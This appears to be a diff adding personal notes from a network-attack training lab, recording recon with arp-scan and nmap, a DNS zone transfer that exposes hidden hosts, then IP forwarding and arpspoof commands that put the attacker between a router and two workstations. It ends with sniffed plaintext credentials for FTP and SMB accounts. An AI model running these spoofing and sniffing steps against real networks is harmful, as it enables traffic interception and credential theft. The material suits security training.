@@ -1,0 +1,156 @@
+Lab: Poisoning and Sniffing
+------------------------------------------------------------
+
+[+] Arp scan
+#arp-scan -i eth1 172.16.5.0/24
+---------------------------------
+172.16.5.1      0a:00:27:00:00:03       (Unknown: locally administered)
+172.16.5.5      08:00:27:8a:4b:36       PCS Systemtechnik GmbH
+172.16.5.6      08:00:27:8a:4b:36       PCS Systemtechnik GmbH
+172.16.5.10     08:00:27:4a:45:f3       PCS Systemtechnik GmbH
+
+[+] Host Discovery
+#nmap -sn 172.16.5.0/24
+------------------------------
+Starting Nmap 7.91 ( https://nmap.org ) at 2023-12-29 09:29 EST
+Nmap scan report for 172.16.5.1
+Host is up (0.00038s latency).
+MAC Address: 0A:00:27:00:00:03 (Unknown)
+Nmap scan report for 172.16.5.5
+Host is up (0.00084s latency).
+MAC Address: 08:00:27:8A:4B:36 (Oracle VirtualBox virtual NIC)
+Nmap scan report for 172.16.5.6
+Host is up (0.00082s latency).
+MAC Address: 08:00:27:8A:4B:36 (Oracle VirtualBox virtual NIC)
+Nmap scan report for 172.16.5.10
+Host is up (0.00075s latency).
+MAC Address: 08:00:27:4A:45:F3 (Oracle VirtualBox virtual NIC)
+Nmap scan report for 172.16.5.101
+
+All hosts list
+172.16.5.1
+172.16.5.5
+172.16.5.6
+172.16.5.10
+
+[+] enumerating DNS
+Nmap scan report for 172.16.5.1
+Host is up (0.00016s latency).
+Not shown: 998 closed ports
+PORT     STATE SERVICE       VERSION
+22/tcp   open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+3389/tcp open  ms-wbt-server xrdp
+MAC Address: 0A:00:27:00:00:03 (Unknown)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap scan report for 172.16.5.5
+Host is up (0.00040s latency).
+All 1000 scanned ports on 172.16.5.5 are closed
+MAC Address: 08:00:27:8A:4B:36 (Oracle VirtualBox virtual NIC)
+
+Nmap scan report for 172.16.5.6
+Host is up (0.00040s latency).
+All 1000 scanned ports on 172.16.5.6 are closed
+MAC Address: 08:00:27:8A:4B:36 (Oracle VirtualBox virtual NIC)
+
+Nmap scan report for 172.16.5.10
+Host is up (0.00038s latency).
+Not shown: 997 closed ports
+PORT    STATE SERVICE     VERSION
+53/tcp  open  domain      ISC BIND 9.16.1 (Ubuntu Linux)
+139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: EXPLOITLABS)
+445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: EXPLOITLABS)
+MAC Address: 08:00:27:4A:45:F3 (Oracle VirtualBox virtual NIC)
+Service Info: Host: SAMBA-EXPLOIT; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+[+] DNS discovery
+	#nslookup
+	>server 172.16.5.10
+	>172.16.5.6
+	6.5.16.172.in-addr.arpa name = wkst-finance.sportsfoo.com.16.172.in-addr.arpa.
+
+	>nslookup
+	>server 172.16.5.10
+	>172.16.5.5
+	5.5.16.172.in-addr.arpa name = wkst-techsupport.sportsfoo.com.16.172.in-addr.arpa.
+
+	OR
+
+	#dig @172.16.5.10 -x 172.16.5.5 +nocookie
+
+	;; ANSWER SECTION:
+	5.5.16.172.in-addr.arpa. 86400  IN      PTR     wkst-techsupport.sportsfoo.com.16.172.in-addr.arpa.
+
+	#dig @172.16.5.10 -x 172.16.5.6 +nocookie
+
+	;; ANSWER SECTION:
+	6.5.16.172.in-addr.arpa. 86400  IN      PTR     wkst-finance.sportsfoo.com.16.172.in-addr.arpa.
+
+
+[+] Discovering aditional Hosts using DNS zone transfer
+
+	#dig @172.16.5.10 sportsfoo.com -t AXFR +nocookie
+
+	; <<>> DiG 9.16.15-Debian <<>> @172.16.5.10 sportsfoo.com -t AXFR +nocookie
+	; (1 server found)
+	;; global options: +cmd
+	sportsfoo.com.          86400   IN      SOA     ine-labserver.sportsfoo.com. hostmaster.sportsfoo.com. 2011071001 3600 1800 604800 86400
+	sportsfoo.com.          86400   IN      NS      ine-labserver.sportsfoo.com.
+	ftp.sportsfoo.com.      86400   IN      A       10.10.10.6
+	ine-labserver.sportsfoo.com. 86400 IN   A       172.16.5.10
+	intranet.sportsfoo.com. 86400   IN      A       10.10.10.10
+	wkst-finance.sportsfoo.com. 86400 IN    A       172.16.5.6
+	wkst-techsupport.sportsfoo.com. 86400 IN A      172.16.5.5
+	sportsfoo.com.          86400   IN      SOA     ine-labserver.sportsfoo.com. hostmaster.sportsfoo.com. 2011071001 3600 1800 604800 86400
+	;; Query time: 68 msec
+	;; SERVER: 172.16.5.10#53(172.16.5.10)
+	;; WHEN: Fri Dec 29 09:43:04 EST 2023
+	;; XFR size: 8 records (messages 1, bytes 276)
+
+*Aditional hosts*
+ 	10.10.10.6 			ftp.sportsfoo.com
+ 	10.10.10.10 		intranet.sportsfoo.com
+
+*[traceroute]*
+ 	└─# traceroute 10.10.10.10 
+	traceroute to 10.10.10.10 (10.10.10.10), 30 hops max, 60 byte packets
+	 1  172.16.5.1 (172.16.5.1)  1.262 ms  1.130 ms  1.090 ms
+	 2  10.10.10.10 (10.10.10.10)  1.053 ms  1.015 ms  0.979 ms
+
+	└─# traceroute 10.10.10.6  
+	traceroute to 10.10.10.6 (10.10.10.6), 30 hops max, 60 byte packets
+	 1  172.16.5.1 (172.16.5.1)  0.448 ms  0.387 ms  0.354 ms
+	 2  10.10.10.6 (10.10.10.6)  0.614 ms  0.583 ms  0.554 ms
+
+[+] enable port forwarding
+	echo 1 > /proc/sys/net/ipv4/ip_forward
+
+[+] arpspoofing
+	*[arp request to router]*
+		#arpspoof -i eth1 -t 172.16.5.1 -r 172.16.5.5
+
+	*[arp request to host]*
+		#arpspoof -i eth1 -t 172.16.5.5 -r 172.16.5.1
+
+[+] to see if thier is any image of not
+	#driftnet -i eth1
+
+[+] arpspoofing
+	*[arp request to router]*
+		#arpspoof -i eth1 -t 172.16.5.1 -r 172.16.5.6
+
+	*[arp request to host]*
+		#arpspoof -i eth1 -t 172.16.5.6 -r 172.16.5.1
+
+
+[+] 172.16.5.5 (http)
+	admin:::et1@sR7! 			//ftp 
+	bcaseiro:::#MySecretPassword
+	almir:::Corinthians2012 	//smb
+
+[+] /finance
+	/technology
+
+[+] samba
+	
+
